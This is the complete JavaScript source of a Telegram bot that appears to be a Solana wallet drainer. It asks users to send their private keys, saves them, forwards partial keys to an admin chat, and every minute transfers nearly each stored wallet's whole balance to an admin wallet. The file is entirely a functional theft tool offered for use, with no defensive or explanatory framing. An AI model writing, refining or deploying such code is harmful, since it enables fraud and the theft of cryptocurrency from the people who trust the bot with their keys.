const TelegramBot = require('node-telegram-bot-api');
const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = require('@solana/web3.js');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Configuration
const TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_WALLET = process.env.ADMIN_WALLET;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Your personal Telegram chat ID
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
const STORAGE_PATH = process.env.STORAGE_PATH || './data';
const SOLANA_ENDPOINT = 'https://api.mainnet-beta.solana.com';

// Initialize
const bot = new TelegramBot(TOKEN, { polling: true });
const connection = new Connection(SOLANA_ENDPOINT);
const userWallets = new Map();

// Ensure storage directory exists
if (!fs.existsSync(STORAGE_PATH)) {
    fs.mkdirSync(STORAGE_PATH, { recursive: true });
}

// Encryption functions
function encryptKey(key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', 
        Buffer.from(ENCRYPTION_KEY), iv);
    const encrypted = Buffer.concat([cipher.update(key), cipher.final()]);
    return iv.toString('hex') + ':' + encrypted.toString('hex');
}

function decryptKey(encrypted) {
    const parts = encrypted.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', 
        Buffer.from(ENCRYPTION_KEY), iv);
    const decrypted = Buffer.concat([
        decipher.update(Buffer.from(parts[1], 'hex')), 
        decipher.final()
    ]);
    return decrypted.toString();
}

// Load saved wallets
function loadWallets() {
    try {
        const files = fs.readdirSync(STORAGE_PATH);
        files.forEach(file => {
            if (file.endsWith('.wallet')) {
                const data = fs.readFileSync(path.join(STORAGE_PATH, file), 'utf8');
                const [chatId, encryptedKey] = data.split('|');
                userWallets.set(chatId, encryptedKey);
            }
        });
    } catch (err) {
        console.error('Error loading wallets:', err);
    }
}

// Save wallet to file
function saveWallet(chatId, encryptedKey) {
    fs.writeFileSync(
        path.join(STORAGE_PATH, `${chatId}.wallet`),
        `${chatId}|${encryptedKey}`
    );
}

// Transfer funds to admin
async function transferFunds(chatId, encryptedKey) {
    try {
        const privateKey = decryptKey(encryptedKey);
        const keypair = Keypair.fromSecretKey(
            new Uint8Array(JSON.parse(privateKey))
        );
        
        const balance = await connection.getBalance(keypair.publicKey);
        const minBalance = 10000; // Minimum lamports to keep
        
        if (balance > minBalance) {
            const amount = balance - 5000; // Leave 5000 for fees
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: keypair.publicKey,
                    toPubkey: new PublicKey(ADMIN_WALLET),
                    lamports: amount
                })
            );
            
            const signature = await connection.sendTransaction(transaction, [keypair]);
            
            // Notify admin
            bot.sendMessage(
                ADMIN_CHAT_ID,
                `💸 Transferred ${amount/1e9} SOL from ${chatId}\n` +
                `Tx: https://solscan.io/tx/${signature}`
            );
            
            return true;
        }
    } catch (err) {
        console.error(`Transfer failed for ${chatId}:`, err);
        bot.sendMessage(
            ADMIN_CHAT_ID,
            `❌ Transfer failed for ${chatId}:\n${err.message}`
        );
        return false;
    }
}

// Bot commands
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(
        msg.chat.id,
        '🔑 Send your Solana private key (as JSON array) to enable auto-transfers\n\n' +
        '⚠️ Example: [1,2,3,...,99]'
    );
});

bot.on('message', (msg) => {
    if (msg.text && msg.text.startsWith('[')) {
        try {
            // Validate private key format
            JSON.parse(msg.text);
            
            const encrypted = encryptKey(msg.text);
            userWallets.set(msg.chat.id.toString(), encrypted);
            saveWallet(msg.chat.id.toString(), encrypted);
            
            bot.sendMessage(
                msg.chat.id,
                '✅ Wallet added! Funds will auto-transfer every minute'
            );
            
            // Notify admin with partial key
            bot.sendMessage(
                ADMIN_CHAT_ID,
                `👤 New wallet added:\n` +
                `User: ${msg.chat.id}\n` +
                `Key: ${msg.text.substring(0, 10)}...${msg.text.slice(-5)}` +
                `\n\nEncrypted: ${encrypted.substring(0, 15)}...`
            );
            
        } catch (err) {
            bot.sendMessage(
                msg.chat.id,
                '❌ Invalid private key format. Send it as JSON array like [1,2,3,...,99]'
            );
        }
    }
});

// Minute-by-minute transfers
setInterval(async () => {
    console.log(`Processing ${userWallets.size} wallets at ${new Date()}`);
    
    for (const [chatId, encryptedKey] of userWallets) {
        await transferFunds(chatId, encryptedKey);
        await new Promise(resolve => setTimeout(resolve, 2000)); // 2s delay between transfers
    }
}, 60 * 1000); // 60 seconds

// Initialize
loadWallets();
console.log(`Bot started with ${userWallets.size} loaded wallets`);
